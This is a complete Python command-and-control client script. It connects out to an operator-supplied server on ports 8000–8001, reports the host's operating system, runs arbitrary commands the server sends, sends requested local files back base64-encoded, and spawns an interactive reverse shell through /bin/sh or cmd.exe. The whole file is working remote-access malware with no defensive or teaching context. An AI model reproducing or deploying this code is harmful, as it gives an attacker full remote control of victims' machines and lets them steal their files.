#!/usr/bin/env python3

import socket, subprocess, time, argparse, base64, platform, threading, os

parser = argparse.ArgumentParser("C2_Client")
parser.add_argument("-i", "--ip", help="IP address of the C2 server")
args = parser.parse_args()

# ip = input("1")
# ports = [81, 443, 696, 4444, 5555, 7777, 8000]
ports = [8000, 8001]

def reverse_shell(socket, os_family):
    # RHOST = ip  # IP address of the listener
    # RPORT = port  # Port of the listener
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((RHOST, RPORT))
    s = socket
    if os_family == "Linux":
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    elif os_family == "Windows":
        def s2p(s, p):
            while True:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()

        def p2s(s, p):
            while True:
                s.send(p.stdout.read(1))

        
        p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()


def base64_encode(data):
    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
    Args:
        data (_type_:bytes): The data to encode
    Returns:
        _type_: bytes
    """
    
    delim = b'!!#@'
    if len(data) % 4 != 0:
        data += b'=' * (4 - (len(data) % 4))
    return base64.b64encode(data) + delim

def send_file(socket, file_name):
    """This function sends a file to the C2 server
    Args:
        socket (_type_): The socket to send data to
        file_name (_type_): The name of the file to send
    """
    try:
        with open(file_name, "rb") as f:
            data = f.read()
            data = base64_encode(data)
            socket.sendall(data)
    except:
        socket.sendall(base64_encode(b"[-] File not found"))

def main(ip, ports):
    """This function creates a socket and connects to the C2 server
    Args:
        ip (_type_:str): The IP address of the C2 server
        ports (_type_:list): A list of ports to try to connect to
    """
    # Create socket 
    # print(ip)
    c2_bot = socket.socket()
    # Attempt a connection to the target
    running = True
    # Uncomment below block to continuously attempt to connect to the C2 server
    # while running:
    for port in ports:
        try:
            c2_bot.connect((ip, port))
            print(f"Connected on port {port}")
            os_family = platform.system()
            c2_bot.sendall(base64_encode(os_family.encode()))
            while True:
                command = (c2_bot.recv(4096)).decode()
                file_name = ""
                # print(command)
                if command.lower() == "quit":
                    running = False
                    break
                elif "download" in command:
                    file_name = command.split(" ")[1]
                    command = command.split(" ")[0]
                    send_file(c2_bot, file_name)
                elif "shell" in command:
                    reverse_shell(c2_bot, os_family)
                else:
                    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    return_code = result.returncode
                    c2_bot.sendall(base64_encode(result.stdout))
            break
        except:
            print(f"Connection failed on port {port}")
            time.sleep(1)
    c2_bot.close()
    exit()

main(args.ip, ports)